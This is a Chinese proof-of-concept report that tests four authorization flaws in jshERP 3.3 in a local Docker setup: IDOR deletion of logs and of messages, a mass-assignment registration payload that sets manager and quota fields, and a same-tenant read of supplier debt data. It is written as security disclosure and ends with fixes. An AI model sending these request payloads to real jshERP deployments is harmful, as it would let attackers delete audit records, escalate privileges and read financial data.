# jshERP 3.3 漏洞概念验证报告（4 条污点流）

## 1. 报告信息
- 验证时间: 2026-03-02
- 验证环境: Docker 本地部署 `jsherp:3.3` + `mysql:5.7`
- 目标服务:
  - 前端: `http://localhost:3000`
  - 后端: `http://localhost:9999/jshERP-boot`
- 验证方式: 黑盒接口调用 + 数据库前后对比（PoC 证据）

## 2. 账号与角色上下文
- `jsh`（`user_id=63`, `tenant_id=63`）
- `test123`（`user_id=131`, `tenant_id=63`, `role_id=17`）
- 额外注册账号（PoC 中创建）:
  - `pocma1772426003` / `pocma1772426293`（分别 `tenant_id=132/133`）

说明:
- `test123` 与 `jsh` 同租户，但为不同用户。
- `role_id=17` 的 `RoleFunctions` 不包含“供应商信息/客户信息”相关菜单 ID（25/217/235/237），但仍可直接调用供应商债务接口。

---

## 3. 漏洞一（高危）
### 3.1 污点流
`LogController.deleteResource -> LogService.deleteLog -> logMapper.deleteByPrimaryKey(id)`

### 3.2 风险类型
IDOR / 对象级越权删除（日志）

### 3.3 验证思路
1. 先构造 `jsh` 所有的日志对象（`user_id=63`）。
2. 使用 `test123` token 调用删除接口，删除 `jsh` 的日志 `id`。
3. 对比删除前后数据库记录是否消失。

### 3.4 关键 PoC 请求
- 接口: `DELETE /jshERP-boot/log/delete?id={victimLogId}`
- 攻击身份: `X-Access-Token: <test123_token>`

### 3.5 证据
来自证据文件 `poc_idor_log_msg_seeded.out`:
- 删除前:
  - `20  63  63  poc-log-owner-63-1772426343`
- 攻击请求返回:
  - `{"code":200,"data":{"message":"成功"}}`
- 删除后:
  - 目标记录为空（未查询到 `id=20`）

### 3.6 结论
已复现。`test123` 可删除非本人日志对象，存在对象级鉴权缺失。

---

## 4. 漏洞二（高危）
### 4.1 污点流
`MsgController.deleteResource -> MsgService.deleteMsg -> msgMapper.deleteByPrimaryKey(id)`

### 4.2 风险类型
IDOR / 对象级越权删除（消息）

### 4.3 验证思路
1. 构造 `jsh` 所有的消息对象（`user_id=63`）。
2. 使用 `test123` token 删除该消息 ID。
3. 验证消息记录是否被删除。

### 4.4 关键 PoC 请求
- 接口: `DELETE /jshERP-boot/msg/delete?id={victimMsgId}`
- 攻击身份: `X-Access-Token: <test123_token>`

### 4.5 证据
来自证据文件 `poc_idor_log_msg_seeded.out`:
- 删除前:
  - `3  63  63  poc-msg-owner-63-1772426343`
- 攻击请求返回:
  - `{"code":200,"data":{"message":"成功"}}`
- 删除后:
  - 目标记录为空（未查询到 `id=3`）

### 4.6 结论
已复现。`test123` 可删除非本人消息对象，存在对象级鉴权缺失。

---

## 5. 漏洞三（高危）
### 5.1 污点流
`UserController.registerUser(UserEx) -> UserService.registerUser(...) -> userMapper.insertSelective(ue)`

### 5.2 风险类型
批量赋值（Mass Assignment）导致权限提升/租户配额提升

### 5.3 验证思路
`/user/registerUser` 为可匿名调用接口，正常前端仅传 `loginName/password`。PoC 手工附加敏感字段:
- `ismanager=1`
- `userNumLimit=9999999`
- `expireTime=2099-12-31 23:59:59`
- `remark=poc-mass-assignment`

并验证这些字段被直接写入 `jsh_user/jsh_tenant`。

### 5.4 关键 PoC 请求
- 接口: `POST /jshERP-boot/user/registerUser`
- 请求体:
```json
{"loginName":"pocma1772426293","password":"e10adc3949ba59abbe56e057f20f883e","ismanager":1,"userNumLimit":9999999,"expireTime":"2099-12-31 23:59:59","remark":"poc-mass-assignment"}
```

### 5.5 证据
来自证据文件 `poc_register_mass_assignment.out`:
- 接口回包:
  - `{"msg":"操作成功","code":200}`
- 用户表落库:
  - `133  pocma1772426293  1  0  0  133`
- 租户表落库:
  - `133  pocma1772426293  9999999  2099-12-31 23:59:59  poc-mass-assignment`
- 登录成功:
  - 返回 `token` 与用户信息，说明恶意注册账号可直接使用。

### 5.6 结论
已复现。存在未做字段白名单/服务端强制默认策略的批量赋值问题，可被匿名注册接口利用以提升租户权限边界（超额用户上限、超长有效期、管理标记）。

---

## 6. 漏洞四（中危）
### 6.1 污点流
`SupplierController.getBeginNeedByOrganId(organId) -> SupplierService.getBeginNeedByOrganId -> accountItemMapperEx.getFinishDebtByOrganId(organId)`

### 6.2 风险类型
IDOR / 参数直接对象引用导致越权信息读取

### 6.3 验证结论（实测）
- 跨租户读取（tenant132 -> tenant63）:
  - 返回 `500 获取数据失败`（被租户隔离拦截，未直接读取到跨租户对象）。
- 同租户低权限角色读取:
  - `test123(role=17)` 的角色功能列表不包含供应商/客户相关菜单权限，但可直接请求:
    - `GET /supplier/getBeginNeedByOrganId?organId=57|58|74`
  - 返回均为 `code=200` 且包含债务字段（`needDebt/finishDebt/eachAmount`）。

### 6.4 证据
来自证据文件 `poc_supplier_scope_bypass.out`:
- `role_id=17` 的函数绑定:
  - `69 17 RoleFunctions [210][225]...[212]`
- 系统中供应商/客户相关功能 ID:
  - `25 /system/vendor`
  - `217 /system/customer`
  - `235 /report/customer_account`
  - `237 /report/vendor_account`
- `test123` 直接请求结果:
  - `{"code":200,"data":{"needDebt":0,"eachAmount":0.000000,"finishDebt":0.000000}}`

### 6.5 结论
已复现同租户范围内的对象级读取越权（缺少按用户/角色/对象归属的服务端校验）。
跨租户读取在当前配置下被租户插件部分拦截，但不影响该接口在同租户细粒度授权层面的越权风险。

---

## 7. 综合风险评估
- 高危:
  1. 日志对象可越权删除
  2. 消息对象可越权删除
  3. 匿名注册接口批量赋值可提升租户边界
- 中危:
  4. 供应商债务查询接口存在同租户对象级越权读取

潜在影响:
- 审计数据被任意删除，导致追踪取证失效
- 站内消息被任意删改，造成通知篡改
- 攻击者可注册高配额长期租户账号，突破试用/授权限制
- 低权限用户可读取不应访问的业务往来单位资金信息

---

## 8. 修复建议
1. 对 `deleteByPrimaryKey(id)` 类接口统一增加对象归属校验（`id + tenant_id + owner_id/creator`）。
2. 在 Controller 层或 Service 层引入强制授权检查（基于角色 + 数据权限 + 对象归属）。
3. 对 `/user/registerUser` 使用 DTO 白名单字段绑定；服务端强制覆盖敏感字段（`ismanager/userNumLimit/expireTime/...`）。
4. 对 `supplier/getBeginNeedByOrganId` 增加:
   - 租户约束（已部分具备）
   - 用户数据权限约束（如 UserCustomer / 组织归属）
   - 不满足权限时返回 403，而不是 500。
5. 增加安全回归测试:
   - A 用户不能删除 B 用户日志/消息
   - 匿名注册敏感字段注入应无效
   - 低权限用户访问未授权 `organId` 必须拒绝

---

## 9. 证据文件清单
- `/Users/yuntsy/My/Graduate/Vuln/poc_artifacts/poc_idor_log_msg_seeded.out`
- `/Users/yuntsy/My/Graduate/Vuln/poc_artifacts/poc_register_mass_assignment.out`
- `/Users/yuntsy/My/Graduate/Vuln/poc_artifacts/poc_supplier_scope_bypass.out`
- `/Users/yuntsy/My/Graduate/Vuln/poc_artifacts/poc_supplier_idor.out`（跨租户尝试结果，返回 500）

